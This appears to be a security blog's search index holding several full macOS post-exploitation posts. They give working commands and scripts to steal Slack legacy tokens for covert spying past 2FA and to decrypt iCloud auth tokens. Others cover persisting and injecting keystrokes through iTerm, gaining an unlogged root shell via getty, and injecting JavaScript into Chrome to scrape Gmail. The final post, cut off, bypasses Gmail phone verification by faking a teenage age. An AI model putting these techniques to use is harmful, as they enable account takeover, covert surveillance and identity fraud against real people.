tokens” ? These tokens were associated with legacy custom integrations and early Slack integrations requiring an ambiguous “API token.” They were generated using the legacy token generator and are no longer recommended for use. They take on the full operational scope of the user that created them. If you’re building a tool for your own team, we encourage creating an internal integration with only the scopes it needs to work.From: https://api.slack.com/docs/token-types#legacySlack’s documentation on these tokens is unfortunately useless, save the mention that they are scoped to the individual user rather than the team as a whole (similar to what we would see with bot users).What I’ve managed to piece together is that Legacy Tokens work for a large portion of Slack’s current API endpoints but has some hiccups with more modern endpoints such as some of the calls to the Conversations API. The RTM (Real Time Messaging) API in particular appears to be the perfect usecase for Legacy Tokens.One thing that became quickly obvious was that the Slack desktop client which heaviliy leverages a websocket connection for communication with the Slack servers mimicks a real-world implementation of the RTM API and during the initial login by a user to a team is making use of OAUTH to generate a valid token for the user which will allow the desktop client to provide the user with all of its functionality.It is during this authentication flow that I believe the Slack desktop client is granted a Legacy Token due to it being Slack’s official client; despite the fact that these tokens are not generated for developers and Slack encourages anyone with a Legacy Token to upgrade to more modern tokens. Best of all, it appears that reusing a Legacy Token allows bypassing 2FA/SSO.Perfect :)Legacy tokens can be identified by starting with the characters xoxs-. This is in contrast to User tokens (xoxp-), Bot tokens (xoxb-), and Workspace tokens (xoxa-2 and xoxr-).Acquiring Legacy TokensSlack stores a copy of currently used Legacy Tokens for a user across all the teams the user is actively authenticated to. These tokens can be found in the LevelDB cache stored on disk and located on macOS at $HOME/Library/Application\\ Support/Slack/Local\\ Storage/leveldb/.The LevelDB files appear to use an 8-bit ASCII variant (ASCII is generally a 7-bit character encoding) ISO-8859-1 which can cause issues when attempting to read the files using a terminal.To help mitigate the encoding issue and automate the process of dumping tokens I wrote a script in Ruby called toke_em.toke_em using the standard version of ruby installed on macOS with no third party gems so it is ready to run on a system of your choice with no additional dependencies.Abusing Legacy TokensOriginally I had decided to leave implementation of tokens acquired with toke_em into useful tooling as an exercise to users of toke_em. A few nights ago I realized I should probably write a tool of my own to leverage Legacy Tokens and set off on writing my own terminal-based Slack client with the purpose of covertly monitoring conversations. I also opted to skip implementing any features that could potentially send input that would result in alerting the user in any way.After I got things working and showed some friends I decided I’d share my client with the internet.RespiteRead-only Slack RTM API client for spying on teams.Respite is a terminal based, read-only client for Slack’s RTM API which authenticates using auth tokens to bypass 2FA and SSO.Respite is still under active development and new features will continue to be added near future and serves as a PoC demo for showcasing the full extent of the usefulness of Legacy Tokens extracted with toke_em. Respite can be downloaded from the Blacksun Labs githubClosingThat’s all for now. Make sure to star and watch respite on Github to get updates on new features.Until next time,n0ncetonic" }, { "title": "iCloud Authentication Token acquisition on macOS", "url": "/posts/iCloud-Authentication-Token-acquisition-on-macOS/", "categories": "", "tags": "MacOS, Post-Exploitation", "date": "2019-03-13 00:00:00 +0800", "snippet": "ForewardWhile this is by no means new or groundbreaking information I’ve been meaning to document a process known to the forensic and law enforcement community and provided as part of point-and-click toolkits available to the general public from companies such as Elcomsoft.The aim of this post is to educate readers on the process by which Apple protects iCloud tokens and provide a procedure for manual acquisition of these tokens on modern versions of macOS. Another motivator for posting this article is to make up for the fact that back in mid 2017 I had started writing an article on dumping this tokens without interacting with the Keychain or requiring the user’s password. The bug that allowed this has since been patched but is effective on early versions of 10.13 and prior. I’ve provided a ready-to-go script addressing this specific vulnerability which can found on Github Gists. Extraction on macOSExtraction of iCloud Auth Tokens on macOS is a multi-step process and requires the iCloud Key stored in the targetted user’s keychain.1.) Obtain the user’s iCloud Key2.) Generating the decryption key3.) Decrypting the mmeTokenKey fileLet’s get to it.Note: If you’re looking for a quick and easy automated tool to accomplishes this same procedure, I’ve linked to the (at time of writing) most updated and feature rich fork of MMeTokenDecrypt by security-geeks as manwhoami appears to have deleted their github account and consequentially the original codebase.Obtaining iCloud Key from keychainAs the iCloud Key is stored encrypted within a user’s keychain, extraction requires knowing the keychain password (almost always the same as a user’s login password), or alternatively, utilizing the SecurityFramework to prompt the user for access to the keychain via the security command.We will opt for the latter in this article to illustrate a technique which can be applied a large array of use cases.Obtaining iCloud Key using SecurityFrameworkThe following command will prompt the user to enter their password and returns the base64 encoded iCloud Key via STDOUT. Replace UID with the uid of the intended user. Note: Getting the uid a user is easiest via the id -u [user] command. If no user is specified, the current user’s uid is returned.launchctl asuser UID security find-generic-password -ws &#39;iCloud&#39; Note The user will be prompted for their password twice. This is the standard behavior of macOS and most users will not notice the different permissions being requested. The first prompt grants permission to access the key named iCloud within a user’s keychain while the second prompt grants permission to read the value of the iCloud key which has authorized access in the first prompt.With the iCloud Key successfully obtained it is possible to generate the key used to decrypt the mmeTokenFile containing mmeAuthToken and other iCloud tokens.Generating the decryption keyiCloud Auth Tokens are encrypted using an HMAC-MD5 composed of an undocumented 44 character string used as the HMAC key and the base64 decoded iCloud Key as the HMAC message. The psuedo-code for generating the decryption key and a working implementation in BASH leveraging only tools available on a default macOS installation follow. Yay for living off the land. Note For the curious, /System/Library/PrivateFrameworks/AOSKit.framework/Versions/A/AOSKit contains the subroutine #KeychainAccountStorage _generateKeyFromData: which uses the HMAC Key provided above when generating the decryption key.HMAC Key: t9s&quot;lx^awe.580Gj%&#39;ld+0LG&amp;lt;#9xa?&amp;gt;vb)-fkwb92[}psuedo.code// This psuedocode demonstrates the process of generating the iCloud Auth Token decryption keyhex(hmac.new(key, message, digest(md5)))BASH#!/bin/bash -e# gen_hmac-md5.sh## Given a value for message, generates an HMAC-MD5 for mmeToken decryption# HMAC key is hardcoded. Outputs the result in base64 and hex encoding## n0ncetonic Copyright 2019 Blacksun Research Labs gen_hmac-md5() { message=&quot;$1&quot; key=&quot;t9s\\&quot;lx^awe.580Gj%&#39;ld+0LG&amp;lt;#9xa?&amp;gt;vb)-fkwb92[}&quot; hmac_md5=&quot;&quot; hmac_md5=$(echo -n &quot;$message&quot; |base64 --decode| openssl dgst -md5 -hex -hmac &quot;$key&quot;) echo &quot;base64: $(base64 &amp;lt;&amp;lt;&amp;lt; ${hmac_md5})&quot; echo &quot; hex: $(echo -n ${hmac_md5}&quot;}gen_hmac-md5 $1 Note The hex encoded decryption key is generally preferred for interoperability with other tools.Decrypting mmeAuthKeyNow that a valid decryption key has been generated the iCloud Auth Tokens can be obtained from the encrypted binary plist file stored in the /Users/&amp;lt;USERNAME&amp;gt;/Library/Application Support/iCloud/Accounts/ directory. Files in this directory will either be symlinks with alphanumeric file names or standard files with filenames comprised of 9 digits. In the case of symlinks the email address tied to an iCloud DSID is disclosed as the filename, while the standard files disclose the DSID as the filename. Note The DSID is used in place of a username when authenticating using iCloud tokens. Making note of the DSID is recommended in case it is needed later.Decrypting this file is done with the openssl command and results in xml structured Property List output containing the iCloud Auth Tokens. Ensure you replace DSID in this command with the user’s actual DSID.openssl enc -d -aes-128-cbc -iv 0000000000000000 -K Hex_Encoded_Decryption_Key &amp;lt; &quot;/Users/USERNAME/Library/Application Support/iCloud/Accounts/DSID&quot; | plutil -extract &#39;tokens&#39; xml1 -o - - Note For output which lends itself better to scripting, copy-pasting, and readability, the decrypt command above can be changed to the command below. openssl enc -d -aes-128-cbc -iv 0000000000000000 -K a8f930a309a9188ca03877444ccaac6c &amp;lt; &quot;/Users/user/Library/Application Support/iCloud/Accounts/8305714318 | plutil -extract &#39;tokens&#39; xml1 -o - - |plutil -p -Resulting in output similar to below{ &quot;cloudKitToken&quot; =&amp;gt; &quot;iOIQ4Yq3J9l2AICrGYJt5pwl+k/sQJ2+FolAJNZ9ci++clFWhc1wx4/OrxK8u2Bexob0ZUC8K83guTCpNZonFpl9qSFRfaXyQ/2ga1hlfMMtYoj5MSElq2O4L9D02JCBmbmnXns3AIJusWW8AdxLNoVPZUaZdxd1CngEW3AS/2YltFHvhbhIyUkknMtHLUj5uoNJw6vfFumI10~~&quot; &quot;mapsToken&quot; =&amp;gt; &quot;KW5Izw7FnUm/tbA81aTi4OLaZOzI0EQPmrajqC3W8ayFyyFTlWMCiEBWd8SnxeXJfx2HtOm2yNdmR01UFRAub2SnzPwmz7i4fiWI4h5VFd1ewVZR33QGBJBTXJqilvcC5Lz9huS1Kqqv8DxZeyWTm4hAVzQ0sqyuQG/yFLwjZydOIBICEAXUqdGSEnCdcyvFjlSd0ZDmZTFc10~~&quot; &quot;mmeAuthToken&quot; =&amp;gt; &quot;Cw7Dzec+TpidWj26lmHGnCnIOQJeK3GR63+XCNT9E8CNrdJkooOgw6wtwRhJwcWRgynVnuFUGr2dYfycgnFxj5FGVAjh/8Y8yhUSn6VlDZcC7Kj+UTfnKsX5aW5GUki2iOttBNalYtiZLuVSub1MnghMpHY+Xtl6fEXSFi5A8culgXPsVbQdF4SGCPTzP9PQj+1qgk4iezr710==&quot; &quot;mmeBTMMInfiniteToken&quot; =&amp;gt; &quot;SDgbvkIEolIutlD4rwlnuAkzmaZbOCc7f4hVYXWRzCqOsvQSQ6D5Vorc+p7UE7t08+tK7T3FVzSTiofE5oidM0jJCW7NaFPgKEFOVjK4aK/2ctcEQ/y1nv0eQcee/XJeI/mK/YBgmTsbIZ74+OUL9mr4t/IrQJffEBTR0FPFhoMhxwcP/kMCtEfD8egN4SUTkT6K8flQGqnT10~~&quot; &quot;mmeFMFAppToken&quot; =&amp;gt; &quot;k+qpMM9hOUnUoIeamVsq+RYyBWxL0OSKFECvsGBu+I3loe3Wvl6dl8UeLeMQc6NJgrGjrYvwd1RsdpDiRFYNNm2mAI15GMTII6HJlzk9N6Ufla6rFDAQ8Yj861SPH7d1JcMiTXMZ/vKNpJqSOp26FRAwudozBTICYfb3RkLOicKydXaY5PTX6iCRPi17OqKsMbY3FhbZJTYJ10~~&quot; &quot;mmeFMIPToken&quot; =&amp;gt; &quot;Ha0+FmWTnkjckMixOlKhvwNohQ1H9+QkVBovAVyVpGXGWiypbcIMByozSTtSWzb2CFEfWY3X4JkWAE35PLrG8yFEX1qYAMLTeoxeumVblCK30tBCgXv2RmB+CbrTSCKWyF7IR48eJ69c0gWWvMnhsDXLNvEUFiW0t6g6ktcQW8n/mS+ObqRw2SCYqS+1ZjMJKkmTJvd7iPF310~~&quot;}ClosingThere you go; you’ve got a handful of tokens ready to be used with iCloud APIs like “FindMyFriends”, “FindMyiPhone”, “iPhotos” and more.iCloud identity theft at the tips of your fingers means flattery has never been easier. “Imitation is the sincerest form of flattery”Charles Caleb Coltonsecurity-geeks/MMeTokenDecrypt" }, { "title": "macOS Persistence via iTerm", "url": "/posts/macOS-persistence-via-iterm/", "categories": "", "tags": "MacOS, Persistence", "date": "2019-03-06 00:00:00 +0800", "snippet": "ForewordmacOS’s default Terminal.app is garbage, and everyone knows it; they also know iTerm is by and large the most popular terminal replacement for macOS. But did you know iTerm is also a fantastic way to persist on a macOS host?I’ve been sitting on this for far too long and quite honestly I had completely forgotten I had never shared this fun little technique. So here it is.BackgroundThere are two directories which iTerm2 checks for AutoLaunch scripts during execution. These AutoLaunch scripts are intended to allow users to automate a number of start-up tasks via iTerm2’s AppleScript Scripting Definition. While this is the intention, iTerm2 will blindly execute whatever code is in the Autolaunch.scpt file regardless of whether or not the code bothers to interact with iTerm2.Autolaunch.scpt locations: ~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt This location is checked first and may not exist on your system Go ahead and create the ~/Library/Application Support/iTerm2/Scripts/ directory if it doesn’t already exist. If this directory doesn’t exist the next path is checked as a legacy fallback. ~/Library/Application Support/iTerm/Scripts/AutoLaunch.scpt !! DEPRECATION NOTICE !! This path is only being checked due to legacy reasons and should be considered deprecated. If you rely on this path to always be an option it may eventually come back to bite you. Note: This only kicks off during application launch, spawning an extra tab in your terminal won’t do much and neither will spawning a new window.PoC||GTFOThis one is pretty easy. Honestly it’s almost too easy which makes me wonder why I haven’t heard of other people using this technique.BASHing buttonsNeed to show this off to your security team and don’t want to invest a whole lot of time on a PoC? This one is for you.#!/bin/bash## bsrl_iTerm-00.sh# Useless payload but it gets the point across###############################################say &quot;iTerm, uTerm, we all Term for code exec&quot;Go ahead and toss that into ~/Library/Application Support/iTerm2/Scripts/AutoLaunch.scpt ( please make sure you name is AutoLaunch.scpt :3 ), unmute your speakers, and restart iTerm2.What’s great is that this will run regardless of whether or not it has executable permissions set. Perfect.Wait whut?At first I was pretty excited having instantly assumed the file extension made no difference to iTerm. That would’ve been nice.I honestly haven’t had enough spare fscks to dig into this in order to be certain but I tested with a simple python script to no avail.When I sat back I realized the reason the bash script worked was due to the fact that say is part of the AppleScript language and all the other lines are comments…Whoops!Snakes on a planeNot all is lost if you don’t want to write AppleScript though. Luckily AppleScript allows us to run shell commands which opens up a whole host of built-in languages for us.(* * bsrl_iterm-01.scpt * * Downloads a random image from XKCD * and opens it with whichever app is * registered as its opener * (Preview.app by default) *)set theCommand to quoted form of &quot;import urllib;urllib.urlretrieve(\\&quot;https://imgs.xkcd.com/comics/random_number.png\\&quot;, \\&quot;/tmp/xkcd.png\\&quot;)&quot;do shell script &quot;/usr/local/bin/python &quot; &amp;amp; &quot;-c &quot; &amp;amp; theCommanddo shell script &quot;/usr/bin/open &quot; &amp;amp; &quot;/tmp/xkcd.png&quot;Kinda cool? Not really…But wait; there’s more!What if I told you that in addition to learning something fun about persistence, today you were also blessed with the gift of command execution within a real life shell :O. Just think of all the fun you could have with the ability to wait for a user to run sudo or ssh to a server and then inject your dirty bits right into their console.This script will work as an AutoLaunch.scpt but it can also be run at any time to inject keystrokes into any window, any session, and any tab.tell application &quot;iTerm&quot; tell current session of current window set thePath to quoted form of &quot;/tmp/bsrl_iterm-02.txt&quot; write text &quot;echo &quot; &amp;amp; &quot;&#39;yay RCE&#39;&quot; &amp;amp; &quot; &amp;gt;&amp;gt; &quot; &amp;amp; thePath write text &quot;say we did it&quot; end tellend tell Note On macOS 10.14, Mojave has locked down the otherwise wide open Apple Events system and now requires that applications be given express permission to send Apple Events to other applications. Because of this security enhancement it is currently not possible to inject commands into the context of iTerm without prompting the user for permission –unless they have previously allowed it. The above technique will allow you a small window for injecting commands into iTerm. Ambitious readers can surely devise schemes which take advantage of this window for more nefarious deeds. If you wind up writing something and would like to share or discuss it, feel free to reach out to me via twitter @noncetonic ClosingWelp that’s all for now folks. Have fun with the new toys in your arsenal.Further ReadingFor those of you who are interested in learning more about some of the topics I glossed over in this post I’ve included some links. iTerm2’s Scripting Documentation : https://iterm2.com/documentation-scripting.html Everyday AppleScriptObjC 3rd Edition : https://sites.fastspring.com/myriadcommunications/product/everydayasobjc AppleScript Language Guide : https://developer.apple.com/library/archive/documentation/AppleScript/Conceptual/AppleScriptLangGuide/introduction/ASLR_intro.html#//apple_ref/doc/uid/TP40000983-CH208-SW1" }, { "title": "Scriptless Identification of Browsers", "url": "/posts/scriptless-identification-of-browsers/", "categories": "", "tags": "Fingerprinting", "date": "2019-01-11 00:00:00 +0800", "snippet": "ForewordThis is a fairly short post illustrating a technique for identifying a browser based on request headers. This technique is not reliant on any scripting support and sucessfully identifies browsers regardless of User-Agent spoofing or other such obfuscation techniques.Provided alongside this post is a PoC tool that implements the checks mentioned in this post.BackgroundRequest headers sent by browsers are fairly standard but due to implementation details in individual browser codebases provide metadata unique to the browser which can be used to positively identify the browser.As request headers can be read server-side without the need for any client-side scripting capabilities this technique is useful for identifying a browser which has extentions/plugins installed aimed at disrupting fingerprinting.Where them headers at?Here are some examples of different request headers sent by Chrome, Firefox, and Safari.ChromeGET / HTTP/1.1Host: localhost:8081Connection: keep-aliveUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/68.0.3440.106 Safari/537.36Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8Accept-Encoding: gzip, deflate, brAccept-Language: en-US,en;q=0.9FirefoxGET / HTTP/1.1Host: localhost:8081User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.13; rv:62.0) Gecko/20100101 Firefox/62.0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflateConnection: keep-aliveUpgrade-Insecure-Requests: 1SafariGET / HTTP/1.1Host: localhost:10101Connection: keep-aliveUpgrade-Insecure-Requests: 1Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15&#39;,Accept-Language: en-usAccept-Encoding: gzip, deflateGG noncetonic, so what?Astute readers may notice the following: After the GET request and Host header all browsers use the same handful of headers but with unique order. Some headers contain details in one browser that are not in other browsers. Some browsers use different case in headers which other browsers do not.When these points are combined, the following fingerprints are derived.Identifying Chrome Unique order of request headers Accept-Encoding lists br as an encoding which allows support for brotli encoding https://en.wikipedia.org/wiki/Brotli Accept adds two mime-types not typically seen explictly stated with other browsers (despite other browsers having support for these mime-types) : image/webp and image/apng. Accept-Language has a modified q value (currently unsure of the significance of the q variable) of 0.9 contrasting the 0.5 of Firefox and the complete omission of the q variable in SafariIdentifying Safari Unique order of request headers Accept-Language lists only en-us and omits the ,en;q=0.X format of Chrome and Firefox. Additionally, both Chrome and Firefox use the spelling en-US but Safari uses en-us instead.Identifying Firefox Unique order of request headersDamn, Daniel!Taking the above rules and creating fingerprints based on them is extremely easy. Here are arrays for each of these three browsers containing the order of request headers unique to that browser.chrome = [&quot;host&quot;,&quot;connection&quot;,&quot;upgrade-insecure-requests&quot;,&quot;user-agent&quot;,&quot;accept&quot;,&quot;accept-encoding&quot;,&quot;accept-language&quot;]firefox= [&quot;host&quot;,&quot;user-agent&quot;,&quot;accept&quot;,&quot;accept-language&quot;,&quot;accept-encoding&quot;,&quot;connection&quot;,&quot;upgrade-insecure-requests&quot;]safari= [&quot;host&quot;,&quot;connection&quot;,&quot;upgrade-insecure-requests&quot;,&quot;accept&quot;,&quot;user-agent&quot;,&quot;accept-language&quot;,&quot;accept-encoding&quot;]One thing to note is the inclusion of certain headers such as DNT and Pragma which are not seen unless settings are enabled in the browser or a browser is explictly forcing a non-cached request to a page. For these reasons certain headers have been ignored.My favorite rapper is 2-PoC(Ok, so there aren’t really 2 PoCs and I don’t really like 2-Pac but I needed a pun for this second title.)I’ve shared a PoC node.js server that outputs the detected browser using both request header order as well as unique header details. You can check it out at https://github.com/n0ncetonic/browseRekt .ClosingAs a simple PoC there are definitely browsers missing and more research that could be done; that is an exercise left to the reader. Something worth noting is that as many browsers base their code on the open-source Chromium project (Opera, Vidalia, etc.) this technique will inaccurately assume these browsers to be Chrome. This is a limitation of this technique and other identification methods must be leveraged in order to accurately determine whether the browser is in fact Chrome or a branched code base." }, { "title": "macOS Serial Console Login", "url": "/posts/macOS-serial-console-login/", "categories": "", "tags": "MacOS, Post-Exploitation", "date": "2018-11-18 00:00:00 +0800", "snippet": "ForewordThis short post documents a technique for authenticating as root on macOS and provides procedures for bypassing the default configuration of macOS which explicitly disables the root user. For some added fun—and in keeping with Eric Raymond’s Rule of Diversity–one of the procedures neuters a common mitigation against re-enabling the root user. Rule of Diversity Developers should design their programs to be flexible and open. This rule aims to make programs flexible, allowing them to be used in ways other than those their developers intended.;)The route to rootUnder a default installation of macOS any administratrative user can trivially enable (and disable) the root account via the dsenableroot(8) command. DESCRIPTION dsenableroot sets the password for the root account if enabling the root user account. Otherwise, if disable [-d] is chosen, the root account passwords are removed and the root user is disabled.When enabling the root user via dsenableroot you will be prompted for a “root password” but knowing the root password is not a requirement (and by default root does not have a password); anything you enter here will be accepted as the password for root so long as you don’t fat-finger it when prompted to “verify root password”.user@blacksunlabs:~ $ dsenablerootusername = useruser password:root password:verify root password:dsenableroot:: ***Successfully enabled root user.Secret Squirrel Note It’s worth noting here that this was all done without running the sudo command which might otherwise raise a red flag on networks where users do not commonly run sudo or in cases where solutions such as Centrify have been deployed to trigger session recording when dzdo/sudo are run. One less data point for incident responders during post-mortem examination of a host.Likewise it is similarly easy to disable the root user, allowing administrators to disable the root user after concluding its use.user@blacksunlabs:~ $ dsenableroot -dusername = useruser password:dsenableroot:: ***Successfully disabled root user.MDM: A protectionIt is becoming more and more common to restrict enabling root for end-users on managed workstations. As most end-users have no need for explicitly logging in as root, this is considered good security hygiene.In these situations, attempting to enable root via dsenableroot will produce an error such as this:user@blacksunlabs:~ $ dsenablerootusername = useruser password:root password:verify root password:dsenableroot:: ***Failed to enable root user.We will address the case of hardened workstations near the conclusion of this post.The not so secret life of gettyHistory LessonIf you’ve had the pleasure of contracting tinnitus as a result of prolonged employment in a NOC, you are probably all too familiar with getty(8). You’ve probably also made Null Modem cables out of speaker wire in a pinch.For those with limited familiarity with getty, don’t worry. In a nutshell, getty is in charge of initializing a tty terminal, prompting for user credentials, and passing those credentials over to login(1) to handle the heavy lifting. More specifically, it allows system consoles, psuedo-terminals, or terminals to login to a local system over a non-graphical interface.A link to the pastIn much older versions of macOS—think Mac OS X Jaguar and similar—it was possible to get access to the system console login by entering “&amp;gt;console” as a username on the graphical login screen. This functionality has long-since been removed but it got me wondering about the system console on modern macOS incarnations.PoC||GTFONow that the useful content of this post has been padded with enough background info to not fit in a tweet or two, let’s get to the good bits.The procedure on default or non-hardened workstations is quite simple: dsenableroot to set a root password dsenableroot -d to disable the root account. It really shouldn’t be enabled and upon cursory glance the environment mimicks a default system /usr/libexec/getty console to drop us into a system console login prompt.Once at a system console login prompt simply enter “root” as your login and when prompted, provide the password you set using dsenableroot.user@blacksunlabs:~ $ dsenablerootusername = useruser password:root password:verify root password:dsenableroot:: ***Successfully enabled root user.user@blacksunlabs:~ $ dsenableroot -dusername = useruser password:dsenableroot:: ***Successfully disabled root user.user@blacksunlabs:~ $ /usr/libexec/getty console�D�rwi�BSD�(black�sun�-labs���(tt��005���lo�i�:�root� Password:Last login: Sat Nov 17 12:53:32 on ttys004blacksunlabs:~ root# id -auid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),401(com.apple.access_remote_ae),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)blacksunlabs:~ root# exitlogoutThere you go. Despite root being disabled by Directory Services, logging in via a serial connection such as the system console happily ignores Directory Services and presents us with a fully functional tty and shell. An added bonus is that we did not have to invoke sudo—or even be in the sudoers file 😉—and there is no cascading process tree connecting our root shell to the original user.Remember Churchill Don’t take ‘no’ for an answer, never submit to failure. - Winston ChurchillIf you encountered that pesky “dsenableroot:: ***Failed to enable root user.” message when running dsenableroot remember the Rule of Diversity and add some Churchill for good measure. If the system says “no”, use tools in a way developers hadn’t intended and elbow security mitigations in the face for doubting your skills.As was shown in the previous procedure, the only thing that’s actually needed is a known password for the root user. While dsenableroot allows us to circumvent sudoers restrictions and cover our tracks a bit, it does still require knowing the password of a user with administrative permissions.Taking advantage of the fact that most macOS workstations follow the “single user administrator” model we have a few potential ways for leveraging our administrator user’s credentials to set a password for the root user.dscl(1) is used here to mimick administrative best practices for managing macOS user credentials via Directory Services, but sudo passwd root would work just as well.user@blacksunlabs:~ $ dsenablerootusername = useruser password:root password:verify root password:dsenableroot:: ***Failed to enable root user.user@blacksunlabs:~ $ sudo /usr/bin/dscl . -passwd /Users/rootPassword:New Password:01:57:11 user@blacksunlabs:~ $ /usr/libexec/getty console�D�rwi�BSD�(black�sun�-labs���(tt��005���lo�i�:�root� Password:trogers-ltm:~ root# id -auid=0(root) gid=0(wheel) groups=0(wheel),1(daemon),2(kmem),3(sys),4(tty),5(operator),8(procview),9(procmod),12(everyone),20(staff),29(certusers),61(localaccounts),80(admin),701(com.apple.sharepoint.group.1),401(com.apple.access_remote_ae),33(_appstore),98(_lpadmin),100(_lpoperator),204(_developer),250(_analyticsusers),395(com.apple.access_ftp),398(com.apple.access_screensharing),399(com.apple.access_ssh)trogers-ltm:~ root# logoutFrom “Go To Hell!” to “Yo! Root Shell!” No sadfeels bourbon today, you just earned celebratory bourbon!**ClosingHonestly I’m just glad I finally got around to writing this up. I had a need for a sneaky means of elevated persistence on a system and this idea occurred to me but as is common due to the mercurial nature of my work, the idea got shelved and priorities shifted constantly, and I never found myself in a situation formally investigate and document this technique.Also, before i see the tweets, yes, it is possible to provide the -u admin username, -p admin password, and -r rootpassword as flags to dsenableroot, I personally prefer to be prompted interactively for these bits of information to avoid accidentally writing sensitive information to history files." }, { "title": "Chrome Arbitrary Javascript Injection Via AppleScript", "url": "/posts/chrome-arbitrary-javascript-injection-via-applescript/", "categories": "", "tags": "MacOS, Post-Exploitation", "date": "2017-12-13 00:00:00 +0800", "snippet": "ForewordI’ve had a PoC for this technique for a little while as part of research for a future talk on the subject of post-exploitation in MacOS, but as an article has surfaced detailing the adware OSX.Pirrit’s use of this technique, I thought it appropriate to disclose this writeup. It should be noted that while this particular PoC targets only Google Chrome, the attack works against Safari as well. Mozilla Firefox is exempt from this specific attack as they do not expose a similar scripting definition to AppleScript.Browser hijacks are hard, let’s go shoppingWouldn’t it be nice to inject arbitrary Javascript into a user’s browser regardless of XSS detection, website, or hoping a user is foolish enough to visit a BeEF link?Sniffing credentials right out of form submissions, disregarding 2FA by leveraging a victim’s already active tab, redressing/overlay attacks and much more are possible with this technique, and all done with no specialized tools.Join me as I rush to release this post before everyone writes detection around this surprisingly well documented feature of Chrome/Safari on MacOS and create a mostly harmless inject which sneakily scrapes a Gmail tab for Email, Sender name, and Subject informatino leveraging Applescript as an In-Memory Javascript InjectorHas anyone really ever been as far as to do want inject javascript?The PoCYou probably don’t care about the how and just want a pre-packed PoC ready to be used for rickrolling your friends so here it is:Full Chrome Gmail Javascript Injection AppleScriptNon-Minified Javascript payloadMinimized OSAScript onelinerMinified Javascript payload (keeps size of Applescript payload/oneliner small)How the whut?Put simply, AppleScript is boss and very few built-in scripting languages on other Operating Systems come close to the amount of power that given to end-users and developers. Intended primarily to be used for automation, AppleScript has the potential to open the door to a lot of fun for system administrators and hackers alike.Applications with dedicated integrations with AppleScript contain an .sdef file which outlines the _S_cripting _Def_initions available to AppleScript. Poking around a bit on my system I noticed that Chrome and Safari had .sdef files.Here’s a link to Chrome’s for those who want to follow alongFor a little more fun Here is an example provided by Google themselves on executing Javascript in the browserWriting a little bit of AppleScript to take advantage of this feature and leveraging a Javascript minimizer to keep the size of the payload small results in a really fun little browser hijack technique.What’s it do?While a primer on AppleScript is outside the scope of this post, a quick breakdown of the code is provided as comments in the provided code to aid the reader.RTFMClosingWhile I’m sad that I wasn’t the first one to weaponize this technique publicly I hope that this public release of a fairly harmless PoC will spark discussion around writing more creative payloads and help excite malware authors and security researchers to take more time to look at MacOS and develop more post-exploitation techniques.I leave implementation of this PoC in Safari as an exercise for the reader.RIP Trevor; another fun bug squashed in public." }, { "title": "Cultivating An Online Persona Part 1 - Bypassing Gmail&#39;s Phone Verification", "url": "/posts/cultivating-an-online-persona-1/", "categories": "", "tags": "OSINT", "date": "2017-07-17 00:00:00 +0800", "snippet": "ForewordCultivating an online persona in the modern era of the internet can be difficult without giving up too much of your own personal information due to the rise of spammers leveraging bots to generate bulk accounts. This leaves the anonymity minded individual with very few options for anonymously registering an account with many services short of paying for services such as recyclable SMS numbers, buying bulk accounts from Phone Verified Account (PVA) shops, or buying SIM cards for one-time use.Additionally, services are beginning to prompt users to provide photographic proof of their identity making burner SIM cards and other anonymous SMS verification methods only one part of the problem.The “Cultivating An Online Persona” series will discuss various methods for obtaining access to popular online services while maintaining a user’s anonymity as well as provide readers with an insight into methodologies which can be employed against other services.Email Addresses Are ImportantIn a world where your email address is as good as your state ID and act as your gateway to registering for other services, the first step towards cultivating an online persona hinges upon your ability to create an email address which has as little ties to your true identity as possible.Because of the importance of email addresses, this post will focus on creating a Gmail account while bypassing phone verification.Bypassing Gmail’s Phone VerificationWhy Gmail?Many readers may wonder why one would even bother attempting to register a Gmail account when there are other services such as ProtonMail which allow users to register for accounts with no personal information. In the opinion of others, myself included, registering for an email account on services such as this inherently gets your persona grouped into a subset of “non-standard” internet denizens. Additionally, due to the popularity of Gmail the chances of a Gmail hosted email address being banned from use for signup or being used as a trigger for secondary anti-spam/anti-bot verification (SABV) is substantially lower.The TheoryThere have been many free bypasses for Gmail phone verification throughout the years including things such as signing up from third-world countries where mobile phones are less common to leveraging mobile phone emulator software such as BlueStacks. While these techniques worked in the past the success rate has dropped substantially causing many to abandon them as viable. Note: Using mobile phone emulators is an extremely effective way of sneaking by SABV on services primarily accessed via mobile applications such as Instagram.One technique which has been used successfully is a very simple one in nature is to register for a Gmail account using the youngest age allowable by Google’s adherence to the Children’s Online Privacy Protection Act of 1998.According to Google’s age requirement policy, in countries outside of South Korea, Spain, and the Netherlands, registrants must be at least 13 years old to create a Google account. As 13 year olds are not expected to have their own mobile phone for phone verification, providing a secondary email for recovery purposes is enough to bypass phone verification. The sweet spot I’ve found for age range is between 13 and 15 in countries where 13 is the minimum age requirement.The PlanIn order to create our Gmail account we need to satisfy a few requirements: Birth year that puts you between 13 and 15 years old. Email account used to satisfy recovery optionsThese requirements are easily satisfied and will be discussed before the actual creation of the Gmail account.Becoming A TeenagerA great resource for all your online persona needs is FakeNameGenerator. Leveraging FakeNameGenerator it’s as easy as clicking the provided link below to generate a birthdate that puts you within our defined age range. All the fun of being a teen again without all the angst and weird body changes!Generate A Teenage BirthdayGetting A Recovery EmailThere are a lot of places providing email addresses with little to no verification required from a user and a Google search will turn up enough results if you can’t think of one. For the purposes of this post we will use Mail.com. This link will send you straight to their sign-up page. It’s recommended to get your recovery email address to match your desired Gmail address as closely as possible. This isn’t a requirement but it doesn’t hurt in the off chance your registration is checked by an account review process. Note: As this is the 